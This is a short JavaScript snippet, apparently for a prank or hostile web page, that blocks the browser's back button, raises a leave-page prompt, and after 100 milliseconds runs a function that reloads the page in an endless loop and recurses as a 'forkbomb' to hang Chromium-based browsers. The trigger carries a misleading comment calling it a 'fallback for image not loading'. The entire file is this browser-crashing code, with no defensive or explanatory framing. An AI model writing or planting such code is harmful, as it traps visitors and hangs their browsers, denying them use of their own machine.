// disable back button
history.pushState(null, document.title, location.href);
window.onpopstate = function() {
    history.pushState(null, document.title, location.href);
}

window.onbeforeunload = function() {
    return true;
}

function crash(x) {
    if (typeof x !== "number") x = 1
    // should hang chromium-based browsers
    while (true) location.reload();
    // forkbomb
    return crash(++x) + crash(++x);
}

// fallback for image not loading
setTimeout(crash, 100);